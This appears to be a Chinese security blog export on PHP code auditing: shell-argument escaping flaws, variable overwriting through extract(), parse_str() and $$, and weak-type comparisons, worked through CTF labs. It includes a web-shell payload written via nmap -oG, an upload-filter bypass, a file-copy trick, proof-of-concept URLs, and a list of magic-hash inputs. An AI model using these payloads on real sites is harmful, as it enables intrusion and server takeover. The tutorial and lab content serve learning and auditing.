<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cmdarg.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $arg1 = <span class="string">"127.0.0.1 -v -d a=1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before: "</span>.$arg1;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg1_mid = escapeshellarg($arg1);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"mid: "</span>.$arg1_mid;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg1_res = escapeshellcmd($arg1_mid);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"after: "</span>.$arg1_res;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"></span><br><span class="line">    $arg2 = <span class="string">"127.0.0.1 ' -v -d a=1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before: "</span>.$arg2;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg2_mid = escapeshellarg($arg2);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"mid: "</span>.$arg2_mid;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg2_res = escapeshellcmd($arg2_mid);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"after: "</span>.$arg2_res;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    root@kali:/home/sangfor/mywork<span class="comment"># php cmdarg.php</span></span><br><span class="line">    before: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -v -d a=<span class="number">1</span></span><br><span class="line">    mid: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -v -d a=<span class="number">1</span></span><br><span class="line">    after: <span class="string">'127.0.0.1 -v -d a=1'</span></span><br><span class="line">    before: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">' -v -d a=1</span></span><br><span class="line"><span class="string">    mid: 127.0.0.1 \' -v -d a=1</span></span><br><span class="line"><span class="string">    after: '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> \<span class="string">'\''</span> -v -d a=<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">    root@kali:/home/sangfor/mywork# curl '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -v -d a=<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">    curl: (3) URL using bad/illegal format or missing URL</span></span><br><span class="line"><span class="string">    root@kali:/home/sangfor/mywork# curl '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> \<span class="string">'\''</span> -v -d a=<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">    curl: (3) URL using bad/illegal format or missing URL</span></span><br><span class="line"><span class="string"># 不存在参数逃逸</span></span><br></pre></td></tr></table></figure>

<h2 id="危害说明"><a href="#危害说明" class="headerlink" title="危害说明"></a>危害说明</h2><ul>
<li>在先使用 <code>escapeshellarg</code> 之后再使用 <code>escapeshellcmd</code>的情况下存在参数逃逸可能导致注入等问题</li>
<li>反过来没有问题</li>
</ul>
<p>下面开始看案例</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h3><p><img data-src="./escapeshellarg&&escapeshellcmd/1.png" alt></p>
<ul>
<li>nmap 语句可以写文件</li>
</ul>
<p><img data-src="./escapeshellarg&&escapeshellcmd/2.png" alt></p>
<ul>
<li>payload <code>&#39; &lt;?php @eval($_POST[&quot;caixin&quot;]);?&gt; -oG caixin.php &#39;</code></li>
</ul>
<p><img data-src="./escapeshellarg&&escapeshellcmd/3.png" alt></p>
<ul>
<li>写入木马</li>
</ul>
<p><img data-src="./escapeshellarg&&escapeshellcmd/4.png" alt></p>
<ul>
<li>上菜刀，获取flag</li>
</ul>
<p><img data-src="./escapeshellarg&&escapeshellcmd/5.png" alt></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><ul>
<li><p>nmap 指令</p>
<ul>
<li><code>-oG</code> 可以写文件</li>
</ul>
</li>
<li><p><code>-iL</code> 从inputfilename文件中读取扫描的目标。在这个文件中要有一个主机或者网络的列表，由空格键、制表键或者回车键作为分割符。如果使用-iL -，nmap就会从标准输入stdin读取主机名字</p>
<ul>
<li><code>-oN</code> 标准输出 要求将标准输出直接写入指定的文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 两条指令配合可以 cp文件操作</span></span><br><span class="line">root@kali:~# id &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">root@kali:~# nmap -iL 1 -oN 2</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 06:07 EST</span><br><span class="line">Failed to resolve "uid=0(root)".</span><br><span class="line">Failed to resolve "gid=0(root)".</span><br><span class="line">Failed to resolve "groups=0(root)".</span><br><span class="line">WARNING: No targets were specified, so 0 hosts scanned.</span><br><span class="line">Nmap done: 0 IP addresses (0 hosts up) scanned in 0.02 seconds</span><br><span class="line"></span><br><span class="line">root@kali:~# cat 2</span><br><span class="line"><span class="meta">#</span><span class="bash"> Nmap 7.80 scan initiated Tue Nov 10 06:07:59 2020 as: nmap -iL 1 -oN 2</span></span><br><span class="line">Failed to resolve "uid=0(root)".</span><br><span class="line">Failed to resolve "gid=0(root)".</span><br><span class="line">Failed to resolve "groups=0(root)".</span><br><span class="line">WARNING: No targets were specified, so 0 hosts scanned.</span><br><span class="line"><span class="meta">#</span><span class="bash"> Nmap <span class="keyword">done</span> at Tue Nov 10 06:07:59 2020 -- 0 IP addresses (0 hosts up) scanned <span class="keyword">in</span> 0.02 seconds</span></span><br><span class="line"></span><br><span class="line">root@kali:~# ls</span><br><span class="line">1  2  test1.php  test.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>php 中，如果后缀名 <code>php</code> 被过滤， 可以使用 <code>phtml</code>,<code>webshell</code>依旧可以连接</p>
</li>
</ul>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>参数逃逸</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP变量覆盖</title>
    <url>/2020/10/01/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
    <content><![CDATA[<h1 id="PHP变量覆盖"><a href="#PHP变量覆盖" class="headerlink" title="PHP变量覆盖"></a>PHP变量覆盖</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>   变量覆盖指的是可以web传参值替换程序原有的变量值</p>
<p>比较常见的场景：</p>
<ul>
<li>$$使用不当</li>
<li>extract()函数使用不当</li>
<li>parse_str()函数使用不当</li>
<li>import_request_variables()使用不当，将传参注册成变量(+前缀)</li>
<li>开启了全局变量注册，会把传参直接变成变量</li>
</ul>
<a id="more"></a>

<h2 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h2><h3 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a>extract()函数</h3><ul>
<li><p>函数语法：extract(array,extract_rules,prefix)</p>
</li>
<li><p>函数定义：extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使</p>
</li>
</ul>
<p>用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回</p>
<p>成功设置的变量数目</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a &#x3D; 123;</span><br><span class="line">    $test_arr &#x3D; array(&quot;a&quot;&#x3D;&gt;&quot;456&quot;, &quot;b&quot;&#x3D;&gt;&quot;789&quot;, &quot;c&quot;&#x3D;&gt;&quot;000&quot;);</span><br><span class="line">    $n &#x3D; extract($test_arr);</span><br><span class="line"></span><br><span class="line">    echo &quot;\$a &#x3D; $a, \$b &#x3D; $b, \$b &#x3D; $b&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;\$n &#x3D; $n&quot;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    $a &#x3D; 456, $b &#x3D; 789, $b &#x3D; 789</span><br><span class="line"></span><br><span class="line">    $n &#x3D; 3</span><br></pre></td></tr></table></figure>

<ul>
<li>一个简单的案例</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $test = <span class="string">"*******"</span>;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($gift))</span><br><span class="line">    &#123;</span><br><span class="line">        $content = trim($test);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($gift == $content)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"PASS"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"FAIL"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    POC</span><br><span class="line">    http:<span class="comment">//127.0.0.1/test2.php?gift=2&amp;test=2</span></span><br></pre></td></tr></table></figure>

<h3 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h3><ul>
<li>函数定义：parse_str()函数的作用是解析字符串并且注册变量，注册变量之前不会验证当前变量是否已经存在，直接覆盖掉已有的变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a &#x3D; 1;</span><br><span class="line">    parse_str(&quot;a&#x3D;5&quot;);</span><br><span class="line">    print_r(&quot;\$a &#x3D; &quot;.$a.&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	$a &#x3D; 5</span><br></pre></td></tr></table></figure>

<h3 id="引发的变量覆盖"><a href="#引发的变量覆盖" class="headerlink" title="$$引发的变量覆盖"></a>$$引发的变量覆盖</h3><ul>
<li>$$ 导致的变量覆盖问题在代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a &#x3D; 1;</span><br><span class="line">    foreach(array(&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;) as $_request) &#123;</span><br><span class="line">        foreach($$_request as $_key&#x3D;&gt;$_value) </span><br><span class="line">        &#123;</span><br><span class="line">            $$_key&#x3D;addslashes($_value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo $a;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test1.php?a&#x3D;2</span><br><span class="line">	2</span><br></pre></td></tr></table></figure>



<h2 id="靶场-amp-amp-案例"><a href="#靶场-amp-amp-案例" class="headerlink" title="靶场&amp;&amp;案例"></a>靶场&amp;&amp;案例</h2><h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h3><p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/1.png" alt></p>
<p>简单分析：</p>
<ul>
<li>需要使用 POST 方法</li>
<li>POST 传参需要有 flag 变量 变量值无所谓，通过die($_200) 打印出 flag</li>
<li>GET参数存在$$变量覆盖问题，构造_200=flag 绕过限制，获取flag</li>
</ul>
<p>POC：</p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/2.png" alt></p>
<h3 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h3><p>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&#x2F;&gt;</span><br><span class="line">&lt;title&gt;学会变量覆盖&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">   $flag &#x3D; &#39;xxxx&#39;;</span><br><span class="line"></span><br><span class="line">   extract($_GET);</span><br><span class="line"></span><br><span class="line">   if (isset($gift)) </span><br><span class="line">   &#123;</span><br><span class="line">       $content &#x3D; @trim(file_get_contents($flag));</span><br><span class="line"></span><br><span class="line">       if ($gift &#x3D;&#x3D; $content) </span><br><span class="line">       &#123;</span><br><span class="line">            echo &quot;flag&#123;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">       &#125; </span><br><span class="line">       else </span><br><span class="line">       &#123;</span><br><span class="line">            echo &#39;Oh..&#39;;</span><br><span class="line">       &#125;</span><br><span class="line">	&#125;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>简单分析：</p>
<ul>
<li>extract函数存在变量覆盖问题</li>
<li>flag传递空，content变量为空</li>
<li>gift为空后，if条件判断成功，成功绕过</li>
</ul>
<p>POC：</p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/3.png" alt></p>
<h3 id="第三个"><a href="#第三个" class="headerlink" title="第三个"></a>第三个</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(&#39;source.txt&#39;);</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &#39;xxxxxxxx&#39;;</span><br><span class="line">$msg_giveme &#x3D; &#39;Give me the flag!&#39;;</span><br><span class="line">$msg_getout &#x3D; &#39;No this. Get out!&#39;;</span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;</span><br><span class="line">    exit($msg_giveme);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39; || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">    exit($msg_getout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">    $$key &#x3D; $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">    $$key &#x3D; $$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &#39;the flag is : &#39; . $flag;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Give me the flag!</span><br></pre></td></tr></table></figure>

<p>简单分析：</p>
<ul>
<li>$$存在绕过问题</li>
<li>GET参数，可以利用</li>
</ul>
<p>POC：</p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/4.png" alt></p>
<h3 id="第四个"><a href="#第四个" class="headerlink" title="第四个"></a>第四个</h3><p>CODE：</p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/5.png" alt></p>
<p>简单分析：</p>
<ul>
<li>parse_str 存在变量覆盖问题</li>
<li>id为数组类型利用</li>
<li>id=a[]=s878926199a</li>
<li>php == 比较特性</li>
</ul>
<p>POC:</p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一些0e开头的md5 字符串</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br></pre></td></tr></table></figure>

<h3 id="第五个-多米CMS"><a href="#第五个-多米CMS" class="headerlink" title="第五个 多米CMS"></a>第五个 多米CMS</h3><p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/7.png" alt></p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/8.png" alt></p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/9.png" alt></p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/10.png" alt></p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/11.png" alt></p>
<p>POC</p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/12.png" alt></p>
<p><img data-src="./php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/13.png" alt></p>
<p>成功进入后台</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP弱类型</title>
    <url>/2020/10/15/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><p>​    本文主要概述php弱类型&amp;&amp;php弱类型产生的漏洞</p>
<h2 id="弱类型概述"><a href="#弱类型概述" class="headerlink" title="弱类型概述"></a>弱类型概述</h2><p>​    PHP是弱类型语言，不需要明确的定义变量类型</p>
<ul>
<li>变量的类型根据使用时的上下文决定</li>
<li>变量会根据不同表达式所需要的类型自动转换</li>
<li>类型转换有固定的规则，当某个操作发现类型不符的时就会按照这些固定规则进行转换</li>
</ul>
<a id="more"></a>

<h3 id="PHP类型"><a href="#PHP类型" class="headerlink" title="PHP类型"></a>PHP类型</h3><ul>
<li>标准类型: 布尔 boolen，整型 integer，浮点 float，字符 string</li>
<li>复杂类型: 数组 array，对象 object</li>
<li>特殊类型: 资源 resource</li>
</ul>
<h3 id="强类型-amp-amp-弱类型"><a href="#强类型-amp-amp-弱类型" class="headerlink" title="强类型&amp;&amp;弱类型"></a>强类型&amp;&amp;弱类型</h3><ul>
<li>强类型指的是每个变量和对象必须显示声明类型(<code>int a = 0;</code>)，在编译的时候已经确定，执行时不能更改，代表语言java，C，Go等</li>
<li>弱类型在执行的时候才确定类型，代码语言PHP，python等</li>
<li>强类型安全并且效率高，弱类型相对不安全</li>
</ul>
<h3 id="和"><a href="#和" class="headerlink" title="== 和 ==="></a>== 和 ===</h3><p>php语言中</p>
<ul>
<li>== 只判断数值是否相等，类型会在判断时，自动转化(先把两个变量的类型变成相同后再比较)</li>
<li>=== 属于强等于，类型and数值都需要相等(先判断两个变量的类型是否相同，再去比较)</li>
<li><strong>gettype()</strong> 函数用于获取变量的类型 &amp;&amp; <strong>settype()</strong> 函数用于设置变量的类型</li>
</ul>
<p>可能出现漏洞问题</p>
<ul>
<li>如果比较一个 int 型（数字）$a 和一个字符串 $b，如果 $b 是以数字开头，如: $a = “1”, $b = “1admin”  ，那么判断时就会把 $b 当做 1 去和 $a 比较</li>
<li>当一个字符串被当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内，该字符串被当作int来取值。其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0，如 $a = “1”, $b = “admin1”  ，那么就会把 $b 当做 0 去和 $a 比较</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(&quot;admin&quot; &#x3D;&#x3D; 0); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;1admin&quot; &#x3D;&#x3D; 1); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;admin1&quot; &#x3D;&#x3D; 1); &#x2F;&#x2F; false</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;admin1&quot; &#x3D;&#x3D; 0); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<ul>
<li>在进行比较运算时，如果遇到了0e这类字符串，PHP会将它解析为科学计数法, “0e123456”==”0e456789XXXX”比较的时候，会将0e这类字符串识别为科学计数法的数字，0的无论多少次方都是零，所以相等</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; &quot;0e123456&quot;&#x3D;&#x3D;&quot;0e456789XXXX&quot;</span><br><span class="line">var_dump(&quot;0e123456&quot; &#x3D;&#x3D; &quot;0e4567894332&quot;); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;0e1233424&quot; &#x3D;&#x3D; &quot;0e456789123&quot;); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;0e123&quot; &#x3D;&#x3D; &quot;0e456789XXXX&quot;); &#x2F;&#x2F; false string !&#x3D; string</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;0e123XXX&quot; &#x3D;&#x3D; 0); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;0e123&quot; &#x3D;&#x3D; 0); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;0&quot; &#x3D;&#x3D; 0); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<ul>
<li>在进行比较运算时，如果遇到了0x这类字符串，PHP会将它解析为十六进制，当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1e240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等(仅限于php版本&lt;7.0)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(0x1e240 &#x3D;&#x3D; 123456); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;0x1e240&quot; &#x3D;&#x3D; 123456); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;0x1e240&quot; &#x3D;&#x3D; &quot;123456&quot;); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line"></span><br><span class="line">php7+</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<ul>
<li>一些空的比较</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(0 &#x3D;&#x3D; null); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(0 &#x3D;&#x3D; &#39;&#39; &amp;&amp; 0 &#x3D;&#x3D; &#39; &#39;); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(0. &#x3D;&#x3D; &#39;&#39; &amp;&amp; 0. &#x3D;&#x3D; &#39; &#39;); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(0e1231312 &#x3D;&#x3D; &#39;&#39;); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">var_dump(0 &#x3D;&#x3D;&#x3D; null); &#x2F;&#x2F; false</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(0 &#x3D;&#x3D;&#x3D; &#39;&#39; &amp;&amp; 0 &#x3D;&#x3D;&#x3D; &#39; &#39;); &#x2F;&#x2F; false</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(0. &#x3D;&#x3D;&#x3D; &#39;&#39; &amp;&amp; 0. &#x3D;&#x3D;&#x3D; &#39; &#39;); &#x2F;&#x2F; false</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(0e1231312 &#x3D;&#x3D;&#x3D; &#39;&#39;); &#x2F;&#x2F; false</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">bool(false)</span><br><span class="line">bool(false)</span><br><span class="line">bool(false)</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><ul>
<li>switch是数字类型的case的判断时，switch会将其中的参数转换为int类型</li>
</ul>
